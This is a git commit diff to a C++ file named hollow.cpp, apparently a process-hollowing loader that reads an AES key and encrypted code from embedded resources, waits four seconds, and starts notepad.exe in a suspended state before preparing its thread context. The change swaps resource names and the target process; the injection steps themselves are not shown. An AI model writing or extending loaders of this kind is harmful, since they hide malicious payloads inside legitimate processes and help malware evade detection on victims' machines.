d54edb8ff6cf492bccbde43f18ee506c890081c7
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 07:00:20 -0500

    Update hollow.cpp

--- hollow.cpp
+++ hollow.cpp
@@ -24,14 +24,14 @@ int main() {
     Sleep(4000);
     char* key101k;
     DWORD key101kLen;
-    loadResource_with("dhanushkey1", &key101k, &key101kLen);
+    loadResource_with("AESKEY", &key101k, &key101kLen);
     char* code199k;
     DWORD code199kLen;
-    loadResource_with("dhanushcode56", &code199k, &code199kLen);
+    loadResource_with("AESCODE", &code199k, &code199kLen);
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
